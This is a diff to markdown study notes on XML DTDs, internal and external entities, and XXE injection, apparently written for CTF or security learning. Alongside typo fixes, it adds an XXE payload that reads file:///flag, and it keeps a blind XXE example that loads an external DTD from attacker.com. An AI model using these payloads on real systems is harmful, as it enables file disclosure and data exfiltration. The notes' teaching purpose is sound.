@@ -13,7 +13,7 @@
 ```
 
 ## DTD
-* Document Type Definition, defines the structure of an `XML` document. It is placed before the acutal `XML` content.
+* Document Type Definition, defines the structure of an `XML` document. It is placed before the actual `XML` content.
 
 
 ### Internal DTD
@@ -54,13 +54,16 @@
 
 
 ## DTD Entities
-* Entities are like variables, and they live inside `DTD` block. We can declare entities and use them later with `&` and `;` sysmbol before the entity name.
-* They are always reference the enetity begin with `&` and end with `;`
+* Entities are like variables, and they live inside `DTD` block. We can declare entities and use them later with `&` and `;` symbol before the entity name.
+* They are always reference the entity begin with `&` and end with `;`
 
 ### Internal DTD Entity
+* They must be enclosed by `DOCTYPE`!
 ```xml
+<!DOCTYPE pwn [
 <!ENTITY email "some@email.com">
 <!ENTITY author "Alice &email;">
+]>
 <author>&author;</author>
 ```
 
@@ -70,8 +73,11 @@ Result `XML` data:
 ```
 
 ### External DTD Entity
+* They must be enclosed by `DOCTYPE`!
 ```xml
+<!DOCTYPE pwn [
 <!ENTITY author SYSTEM "http://example.com/entities.dtd">
+]>
 <author>&author;</author>
 ```
 
@@ -89,10 +95,14 @@ Result `XML` data:
 <!ENTITY name "Alice">
 <!ENTITY outer "<!ENTITY inner 'My name is &name;'>">
 &outer;
-
+```
+# Simple XXE payload
+* `%26` is `&` urlencoded.
+```xml
+<!DOCTYPE wrapper [<!ENTITY pwn SYSTEM "file:///flag">]> <a>%26pwn;</a>
 ```
 # Blind XXE injections
-* Since we can't directly reference an Entity within an internal DTD, we have to make use an external DTD
+* Since we can't directly reference an Entity within an internal DTD, we have to make use an external DTD. `XXE` is also known as `XML external entity` injection
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
